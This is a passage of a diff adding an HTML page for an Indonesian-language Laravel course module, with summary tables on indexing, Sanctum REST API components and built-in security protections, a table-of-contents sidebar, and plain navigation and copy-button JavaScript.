+          <tr><td>Indexing</td><td>Index kolom yang sering di-<code>WHERE</code>/<code>ORDER BY</code> dan semua foreign key</td></tr>
+        </tbody>
+      </table>
+
+      <h3>REST API dengan Sanctum</h3>
+      <table>
+        <thead><tr><th>Komponen</th><th>File</th><th>Fungsi</th></tr></thead>
+        <tbody>
+          <tr><td>Sanctum</td><td><code>personal_access_tokens</code> table</td><td>Menyimpan token autentikasi</td></tr>
+          <tr><td>User Model</td><td><code>app/Models/User.php</code></td><td>Trait <code>HasApiTokens</code></td></tr>
+          <tr><td>Auth Controller</td><td><code>app/Http/Controllers/Api/AuthController.php</code></td><td>Register, login, logout, me</td></tr>
+          <tr><td>Produk API</td><td><code>app/Http/Controllers/Api/ProdukApiController.php</code></td><td>CRUD produk via JSON</td></tr>
+          <tr><td>API Routes</td><td><code>routes/api.php</code></td><td>Public + protected endpoints</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Keamanan</h3>
+      <table>
+        <thead><tr><th>Ancaman</th><th>Proteksi di Laravel</th></tr></thead>
+        <tbody>
+          <tr><td>CSRF</td><td><code>@csrf</code> di form web; Bearer token di API</td></tr>
+          <tr><td>XSS</td><td><code>{{ }}</code> auto-escape di Blade</td></tr>
+          <tr><td>SQL Injection</td><td>Eloquent/Query Builder pakai prepared statements</td></tr>
+          <tr><td>Mass Assignment</td><td><code>$fillable</code> di Model</td></tr>
+          <tr><td>Unauthorized API</td><td>Middleware <code>auth:sanctum</code> di routes</td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout success">
+        <div class="callout-title">Selamat! Minggu 1 Selesai</div>
+        Kamu sudah membangun aplikasi CRUD web lengkap, memahami relasi Eloquent, tahu cara
+        menghindari N+1 query, dan membuat REST API dengan autentikasi token (Sanctum &amp;
+        <a href="modul-rest-api-jwt.html">JWT</a>). Lanjut ke
+        <a href="modul-arsitektur-otorisasi.html"><strong>Minggu 2</strong></a> untuk merapikan
+        arsitektur kode dengan Repository/Service Pattern dan mengatur hak akses dengan Spatie
+        Roles &amp; Permission, atau ke
+        <a href="modul-optimasi.html"><strong>Minggu 3</strong></a> untuk belajar Redis
+        caching, Laravel Horizon (Queue), dan testing dengan Pest/PHPUnit.
+      </div>
+    </div>
+
+   </div>
+  </main>
+
+  <!-- RIGHT TOC -->
+  <aside class="toc">
+    <div class="toc-title">Daftar Isi</div>
+
+    <a href="#instalasi-persyaratan">Instalasi Laravel</a>
+    <a class="sub" href="#instalasi-persyaratan">Persyaratan</a>
+    <a class="sub" href="#instalasi-xampp">Install via XAMPP</a>
+    <a class="sub" href="#instalasi-wsl">Install via WSL</a>
+    <a class="sub" href="#instalasi-jalankan">Menjalankan Project</a>
+
+    <a href="#crud-intro" style="margin-top:12px;display:block">CRUD Produk</a>
+    <a class="sub" href="#crud-intro">Pengenalan CRUD</a>
+    <a class="sub" href="#crud-migration">Migration</a>
+    <a class="sub" href="#crud-model">Model</a>
+    <a class="sub" href="#crud-controller">Controller</a>
+    <a class="sub" href="#crud-views">Views</a>
+    <a class="sub" href="#crud-routes">Routes</a>
+
+    <a href="#eloquent-dasar" style="margin-top:12px;display:block">Eloquent &amp; Relasi</a>
+    <a class="sub" href="#eloquent-dasar">Query Dasar</a>
+    <a class="sub" href="#eloquent-relasi">Relasi Model</a>
+
+    <a href="#n-plus-one" style="margin-top:12px;display:block">Query Optimization</a>
+    <a class="sub" href="#n-plus-one">Masalah N+1</a>
+    <a class="sub" href="#eager-loading">Eager Loading</a>
+    <a class="sub" href="#indexing">Indexing</a>
+
+    <a href="#pengenalan" style="margin-top:12px;display:block">REST API</a>
+    <a class="sub" href="#pengenalan">Pengenalan</a>
+    <a class="sub" href="#cara-kerja">Cara Kerja</a>
+    <a class="sub" href="#persiapan">Persiapan</a>
+    <a class="sub" href="#install-sanctum">Install Sanctum</a>
+    <a class="sub" href="#setup-user">User Model</a>
+    <a class="sub" href="#setup-bootstrap">Bootstrap API</a>
+    <a class="sub" href="#auth-controller">Auth Controller</a>
+    <a class="sub" href="#produk-api">Produk API</a>
+    <a class="sub" href="#api-routes">API Routes</a>
+    <a class="sub" href="#test-postman">Test Postman</a>
+    <a class="sub" href="#test-curl">Test cURL</a>
+    <a class="sub" href="#error-umum">Error Umum</a>
+
+    <a href="#csrf" style="margin-top:12px;display:block">Keamanan</a>
+    <a class="sub" href="#csrf">CSRF</a>
+    <a class="sub" href="#xss">XSS</a>
+    <a class="sub" href="#sql-injection">SQL Injection</a>
+
+    <a href="#jwt-alternatif" style="margin-top:12px;display:block">Autentikasi Lanjutan</a>
+    <a class="sub" href="#jwt-alternatif">REST API &rarr; JWT</a>
+    <a class="sub" href="#ringkasan">Ringkasan</a>
+  </aside>
+
+</div><!-- .layout -->
+
+<script>
+  // Sidebar accordion
+  document.querySelectorAll('.nav-group-title').forEach(title => {
+    title.addEventListener('click', () => {
+      title.parentElement.classList.toggle('open');
+    });
+  });
+
+  // Laravel nav bar — sub navbar (dropdown) toggle
+  document.querySelectorAll('.laravel-nav-trigger').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      btn.closest('.laravel-nav').classList.toggle('open');
+    });
+  });
+  document.addEventListener('click', (e) => {
+    document.querySelectorAll('.laravel-nav.open').forEach(nav => {
+      if (!nav.contains(e.target)) nav.classList.remove('open');
+    });
+  });
+
+  // Mobile sidebar toggle
+  const sidebarEl = document.querySelector('.sidebar');
+  const overlayEl = document.getElementById('sidebarOverlay');
+  const menuToggleBtn = document.getElementById('menuToggle');
+  function closeSidebar() {
+    sidebarEl.classList.remove('open');
+    overlayEl.classList.remove('show');
+  }
+  if (menuToggleBtn) {
+    menuToggleBtn.addEventListener('click', () => {
+      sidebarEl.classList.toggle('open');
+      overlayEl.classList.toggle('show');
+    });
+  }
+  if (overlayEl) overlayEl.addEventListener('click', closeSidebar);
+  document.querySelectorAll('.sidebar a').forEach(a => a.addEventListener('click', closeSidebar));
+
+  // Wrap tables so they scroll horizontally instead of breaking layout on small screens
+  document.querySelectorAll('.main table').forEach(t => {
+    if (t.closest('.table-scroll')) return;
+    const wrap = document.createElement('div');
+    wrap.className = 'table-scroll';
+    t.parentNode.insertBefore(wrap, t);
+    wrap.appendChild(t);
+  });
+
+  // Copy button on every code block
+  function copyText(text) {
+    if (navigator.clipboard && window.isSecureContext) {
+      return navigator.clipboard.writeText(text);
+    }
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); } catch (err) {}
+    document.body.removeChild(ta);
+    return Promise.resolve();
+  }
+  document.querySelectorAll('pre').forEach(pre => {
+    const codeEl = pre.querySelector('code');
+    const btn = document.createElement('button');
+    btn.type = 'button';
+    btn.className = 'copy-btn';
+    btn.textContent = 'Copy';
+    btn.setAttribute('aria-label', 'Salin kode');
+    btn.addEventListener('click', () => {
+      const text = (codeEl ? codeEl.textContent : pre.textContent).trim();
+      copyText(text).then(() => {
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.textContent = 'Copy';
+          btn.classList.remove('copied');
+        }, 1500);
+      });
+    });
+    pre.appendChild(btn);
+  });
+
+  // Scroll spy for sidebar + TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const navLinks = document.querySelectorAll('.nav-link');
+  const tocLinks = document.querySelectorAll('.toc a');
+
+  function setActive(links, id) {
+    links.forEach(l => {
+      l.classList.toggle('active', l.getAttribute('href') === '#' + id);
+    });
+  }
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        setActive(navLinks, entry.target.id);
+        setActive(tocLinks, entry.target.id);
+        // open parent nav group
+        const activeLink = document.querySelector('.nav-link.active');
+        if (activeLink) {
+          const group = activeLink.closest('.nav-group');
+          if (group) group.classList.add('open');
+        }
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+</script>
+
+</body>
+</html>
